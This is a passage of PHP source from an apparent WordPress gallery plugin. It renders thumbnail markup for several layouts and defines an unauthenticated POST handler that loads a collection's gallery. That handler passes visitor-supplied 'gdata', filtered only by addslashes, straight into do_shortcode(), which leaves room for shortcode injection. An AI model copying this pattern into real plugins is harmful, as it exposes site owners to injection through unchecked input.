				'.$open_tag.' gg-url="'.$img_url.'" gg-title="'.gg_sanitize_input($img['title']).'" class="gg_img '.$add_class.'" gg-author="'.gg_sanitize_input($img['author']).'" gg-descr="'.gg_sanitize_input($img['descr']).'" rel="'.$gid.'" style="width: '.$thumb_w.'px; height: '.$thumb_h.'px;">
				  <div class="gg_img_inner">';
					
					$gallery .= '
					<div class="gg_main_img_wrap">
						<img src="'.$thumb.'" id="'.$gid.'-'.$img_url.'" alt="'.gg_sanitize_input($img['title']).'" class="gg_photo gg_main_thumb" />
					</div>';	
					
					$gallery .= '
					<div class="gg_overlays">'. gg_overlay_manager($img['title']) .'</div>';	
					
				$gallery .= '</div>' . $close_tag;
			}
			
			
			/////////////////////////
			// masonry layout
			else if($layout == 'masonry') {
				
				$thumb = gg_thumb_src($thumb_src, $col_w, false, $thumb_q, $img['thumb']);	
				$gallery .= '
				'.$open_tag.' gg-url="'.$img_url.'" class="gg_img '.$add_class.'" gg-title="'.gg_sanitize_input($img['title']).'" gg-author="'.gg_sanitize_input($img['author']).'" gg-descr="'.gg_sanitize_input($img['descr']).'" rel="'.$gid.'">
				  <div class="gg_img_inner">
					<div class="gg_main_img_wrap">
						<img src="'.$thumb.'" id="'.$gid.'-'.$img_url.'" alt="'.gg_sanitize_input($img['title']).'" class="gg_photo gg_main_thumb" />	
					</div>
					<div class="gg_overlays">'. gg_overlay_manager($img['title']) .'</div>	
				</div>'.$close_tag;  
			}
			
			  
			/////////////////////////
			// photostring layout
			else {
	
				$thumb = gg_thumb_src($thumb_src, false, $row_h, $thumb_q, $img['thumb']);
				$gallery .= '
				'.$open_tag.' gg-url="'.$img_url.'" class="gg_img '.$add_class.'" gg-title="'.gg_sanitize_input($img['title']).'" gg-author="'.gg_sanitize_input($img['author']).'" gg-descr="'.gg_sanitize_input($img['descr']).'" rel="'.$gid.'" style="height: '.$row_h.'px;">
				  <div class="gg_img_inner">
					<div class="gg_main_img_wrap">
						<img src="'.$thumb.'" id="'.$gid.'-'.$img_url.'" alt="'.gg_sanitize_input($img['title']).'" class="gg_photo gg_main_thumb" />	
					</div>
					<div class="gg_overlays">'. gg_overlay_manager($img['title']) .'</div>	
				</div>'.$close_tag;  
			}	
		}
		
		$pag = array();
		$pag['html'] = $gallery;
		$pag['more'] = $more;
		
		echo json_encode($pag);
		die();
	}
}
add_action('init', 'gg_pagination');


//////////////////////////////////////////////////////////////////////////////

////////////////////////////////////////////
////// LOAD GALLERY INSIDE A COLLECTION ////
////////////////////////////////////////////

function gg_load_coll_gallery() {
	if(isset($_POST['gg_type']) && $_POST['gg_type'] == 'gg_load_coll_gallery') {
		if(!isset($_POST['gdata'])) {die('data is missing');}
		$gdata = explode(';', addslashes($_POST['gdata']));
		
		$resp = '';
		if(get_option('gg_coll_show_gall_title')) {
			$resp .= '<h3 class="gg_coll_gall_title">'. get_the_title($gdata[0]) .'</h3>';
		}
		
		$resp .= do_shortcode('[g-gallery gid="'.$gdata[0].'" random="'.$gdata[1].'" watermark="'.$gdata[2].'"]');
		die($resp);
	}
}
add_action('init', 'gg_load_coll_gallery');

